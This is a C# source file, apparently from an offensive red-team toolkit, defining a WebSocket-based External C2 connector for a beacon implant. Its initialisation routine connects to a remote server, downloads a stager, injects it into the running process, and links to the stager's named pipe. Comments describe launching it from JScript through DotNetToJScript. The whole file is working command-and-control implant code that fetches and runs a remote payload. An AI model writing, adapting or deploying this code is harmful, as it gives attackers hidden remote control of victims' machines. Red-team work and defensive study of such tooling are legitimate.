using System;
using System.Runtime.InteropServices;
using ExternalC2.Channels;
using ExternalC2.Connectors;
using ExternalC2.Interfaces;

namespace ExternalC2
{
    /// <summary>
    ///     A simple WebSockets C2 connector to allow communication between the beacon and External C2
    ///     The remote WebSockets handler should send the request to the External C2 socket, and then send back the socket
    ///     response
    ///     Class is ComVisble for DotNetToJScript compatibility
    ///     To use with JScript:
    ///     o.Configure('ws://127.0.0.1/bws');
    ///     o.Go()
    /// </summary>
    [ComVisible(true)]
    public class WebSocketC2 : BeaconConnector, IC2Connector
    {
        /// <summary>
        ///     Create a WebSocketC2 with the specified URL
        ///     URL Format: ws://127.0.0.1/endpoint
        /// </summary>
        /// <param name="url"></param>
        public WebSocketC2(string url)
            : base(new WebSocketChannel(url))
        {
            UrlEndpoint = url;
        }

        /// <summary>
        ///     Public default constructor for DotNetToJScript and Unit Tests
        ///     Use Configure(url) to setup WebSockets client
        /// </summary>
        public WebSocketC2()
        {
        }

        // Convenient casts for use in Initialize()
        private WebSocketChannel Server => (WebSocketChannel) ServerChannel;
        private BeaconChannel Beacon => (BeaconChannel) BeaconChannel;

        /// <summary>
        ///     The WebSockets URL endpoint with the format: ws://127.0.0.1/endpoint
        /// </summary>
        public string UrlEndpoint { get; private set; }

        /// <summary>
        ///     A unique identifier for the connection and beacon's named pipe
        /// </summary>
        public Guid PipeName { get; protected set; }

        /// <summary>
        ///     The main initiliazation function responsible for:
        ///     1. Connecting to the ServerChannel (WebSockets Server)
        ///     2. Retreiving the stager from the ServerChannel
        ///     3. Injecting the stager into the current process
        ///     4. Connecting to the pipe created by the injected stager
        /// </summary>
        public override Func<bool> Initialize => () =>
        {
            Console.WriteLine($"[-] Connecting to Web Socket: {UrlEndpoint}");
            if (!Server.Connect()) return false;

            Console.WriteLine("[-] Grabbing stager bytes");
            PipeName = Server.BeaconId;
            var stager = Server.GetStager(PipeName.ToString(), Is64Bit);

            Console.WriteLine("[-] Creating new stager thread");
            if (InjectStager(stager) == 0) return false;
            Console.WriteLine("[+] Stager thread created!");

            Console.WriteLine($"[-] Connecting to pipe {PipeName}");
            Beacon.SetPipeName(PipeName);
            if (!Beacon.Connect()) return false;
            Console.WriteLine("[+] Connected to pipe, C2 initialization complete!");

            return true;
        };

        /// <summary>
        ///     Configuration function for DotNetToJScript and Unit Tests
        ///     To use with JScript:
        ///     o.Configure('ws://127.0.0.1/bws');
        ///     o.Go()
        /// </summary>
        /// <param name="url"></param>
        public void Configure(string url)
        {
            BeaconChannel = new BeaconChannel();
            ServerChannel = new WebSocketChannel(url);
            UrlEndpoint = url;
        }
    }
}